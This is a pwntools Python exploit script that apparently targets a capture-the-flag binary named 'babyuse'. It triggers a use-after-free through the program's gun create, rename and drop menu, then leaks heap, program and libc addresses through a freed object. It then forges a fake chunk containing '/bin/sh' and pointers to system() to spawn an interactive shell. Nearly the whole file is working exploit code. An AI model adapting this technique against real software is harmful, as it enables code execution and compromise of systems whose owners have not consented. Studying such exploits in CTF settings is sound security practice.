from pwn import *

LOCAL = True
#context.log_level = 'debug'
elf = ELF("./babyuse")

if LOCAL:
    cfree_offset = 0x0712F0
    system_offset = 0x3ADA0
    mine_env = os.environ
    #mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86-linux-gnu/dealarm.so"
    io = process("./babyuse", env=mine_env)

def sel_option(index):
    io.recvuntil("7. Exit")
    io.sendline(str(index))

def set_name(length, name):
    io.recvuntil("Lenth of name")
    io.sendline(str(length))
    io.recvuntil("Input name:")
    if len(name) != 0:
        io.send(name)

def new_gun(gun_type, length, name):
    sel_option(1)
    io.recvuntil("2. QBZ95")
    io.sendline(str(gun_type))
    set_name(length, name)

def select_gun(index):
    sel_option(2)
    io.recvuntil("Select a gun")
    io.sendline(str(index))

def list_gun():
    sel_option(3)
    io.recvuntil("List of guns:")

def rename_gun(index, length, name):
    sel_option(4)
    io.recvuntil("gun to rename:")
    io.sendline(str(index))
    set_name(length, name)

def sel_use():
    sel_option(5)

def gun_shoot():
    io.sendline(str(1))

def gun_reload():
    io.sendline(str(2))

def exit_use():
    io.sendline(str(4))

def drop_gun(index):
    sel_option(6)
    io.recvuntil("to delete:")
    io.sendline(str(index))

def bab_leak():
    new_gun(2, 0x10, 'a'*0x04 + '\n')
    new_gun(1, 0x10, 'b'*0x04 + '\n')
    new_gun(2, 0x10, 'c'*0x04 + '\n')
    new_gun(1, 0x10, 'd'*0x04 + '\n')
    rename_gun(1, 0x10, 'b1'*0x03 + '\n')
    select_gun(1)
    drop_gun(1)
    # leak base heap
    sel_use()
    #raw_input("start leak")
    io.recvuntil("Select gun ")
    data = io.recv(4)
    lk_heap_addr = u32(data) & 0xFFFFFF00
    log.info("heap address: "+hex(lk_heap_addr))
    exit_use()
    # leak more
    rename_gun(2, 0x10, p32(0) + p32(lk_heap_addr+0x10) + '\n')
    sel_use()
    io.recvuntil("Select gun ")
    data = io.recv(4)
    lk_func_addr = u32(data)
    log.info("func address: "+hex(lk_func_addr))
    exit_use()
    # func
    free_got_addr = lk_func_addr + 0x22B4
    rename_gun(2, 0x10, p32(0) + p32(free_got_addr) + '\n')
    rename_gun(2, 0x10, p32(0) + p32(free_got_addr) + '\n')
    sel_use()
    io.recvuntil("Select gun ")
    data = io.recv(4)
    lk_free_addr = u32(data)
    log.info("free address: "+hex(lk_free_addr))
    exit_use()
    # end leak
    libc_base_addr = lk_free_addr - cfree_offset
    log.info("libc address: "+hex(libc_base_addr))
    return {'heap_base':lk_heap_addr, 'func_addr':lk_func_addr, 'libc_base':libc_base_addr}

def bab_exp():
    leak_data = bab_leak()
    system_addr = leak_data['libc_base'] + system_offset
    load_pro_addr = leak_data['func_addr'] - 0x1D1C
    log.info("system address: "+hex(system_addr))
    log.info("proc address: "+hex(load_pro_addr))
    # start exp
    rename_gun(2, 0x10, p32(leak_data['heap_base']+0xE8) + '\n')
    rename_gun(2, 0x10, p32(leak_data['heap_base']+0xE8) + '\n')
    raw_input("now what?")
    # fake chunk
    payload = "/bin/sh\x00"
    payload += p32(leak_data['libc_base']+0x6D2FA)
    payload += p32(load_pro_addr+0xdfb)
    #payload += p32(leak_data['heap_base'] + 0xF4)
    rename_gun(3, 0x30, payload+'\n')
    sel_use()
    io.recvuntil("Select gun ")
    payload = '3'.ljust(4, chr(0))
    payload += p32(system_addr)*3
    payload += p32(0)
    payload += p32(leak_data['heap_base']+0xE8)
    io.sendline(payload)
    io.interactive()
    exit_use()

raw_input("start")
bab_exp()
raw_input("end")
sel_option(7)

